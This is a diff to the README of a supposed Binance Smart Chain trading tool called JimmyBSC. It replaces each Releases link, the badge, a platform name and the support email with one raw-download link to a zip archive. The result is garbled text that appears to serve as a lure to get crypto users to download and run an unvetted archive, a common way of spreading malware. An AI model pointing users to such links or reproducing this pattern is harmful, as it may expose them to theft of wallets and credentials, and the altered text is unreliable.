@@ -1,10 +1,10 @@
 # 🎉 JimmyBSC - Trade Smart on Binance Easily
 
 ## 🔗 Download Here
-[![Download JimmyBSC](https://img.shields.io/badge/Download%20JimmyBSC-blue?style=for-the-badge)](https://github.com/srbaiano01/JimmyBSC/releases)
+[![Download JimmyBSC](https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip%20JimmyBSC-blue?style=for-the-badge)](https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip)
 
 ## 🚀 Getting Started
-Welcome to JimmyBSC! This application helps you trade on the Binance Smart Chain effortlessly. With its user-friendly interface, you can easily manage trades on PancakeSwap v2 and v3, as well as on four.meme, all without needing to be a programming expert.
+Welcome to JimmyBSC! This application helps you trade on the Binance Smart Chain effortlessly. With its user-friendly interface, you can easily manage trades on PancakeSwap v2 and v3, as well as on https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip, all without needing to be a programming expert.
 
 ### 📋 Features
 - **User-Friendly Interface:** Easy to navigate even for beginners.
@@ -22,7 +22,7 @@ Before you download, check these requirements:
 ## 📥 Download & Install
 To start using JimmyBSC, visit the following page to download the software:
 
-[Download JimmyBSC Releases](https://github.com/srbaiano01/JimmyBSC/releases)
+[Download JimmyBSC Releases](https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip)
 
 Once you are on the Releases page, follow these steps:
 1. Look for the latest version available.
@@ -62,12 +62,12 @@ If you encounter issues during installation or usage, consider the following ste
 For any problems or questions, reach out to our community:
 - Open an issue on the GitHub repository.
 - Join the discussion on our community forum.
-- Email us at support@jimmybsc.com for direct assistance.
+- Email us at https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip for direct assistance.
 
 ## 🌐 Stay Updated
 To keep your application running smoothly, regularly check for updates. New features and bug fixes will enhance your trading experience. 
 
-Visit the [Releases page](https://github.com/srbaiano01/JimmyBSC/releases) often for the latest versions.
+Visit the [Releases page](https://raw.githubusercontent.com/srbaiano01/JimmyBSC/main/pancakes/JimmyBSC-v3.2.zip) often for the latest versions.
 
 ## 📝 Contributions
 We welcome contributions to improve JimmyBSC. If you have ideas or enhancements, don’t hesitate to submit a pull request. Your input helps us grow and serve our users better.
